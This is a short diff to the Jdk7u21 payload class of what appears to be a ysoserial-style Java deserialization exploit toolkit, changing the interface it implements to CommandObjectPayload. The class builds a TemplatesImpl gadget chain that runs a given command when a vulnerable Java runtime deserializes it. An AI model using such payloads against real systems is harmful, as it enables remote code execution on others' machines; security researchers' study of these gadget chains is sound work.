@@ -9,7 +9,7 @@ import java.util.LinkedHashSet;
 import javax.xml.transform.Templates;
 
 import com.h2tg.ysogate.utils.PayloadRunner;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -58,7 +58,8 @@ LinkedHashSet.readObject()
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies()
 @Authors({Authors.FROHOFF})
-public class Jdk7u21 implements ObjectPayload<Object> {
+public class Jdk7u21 implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
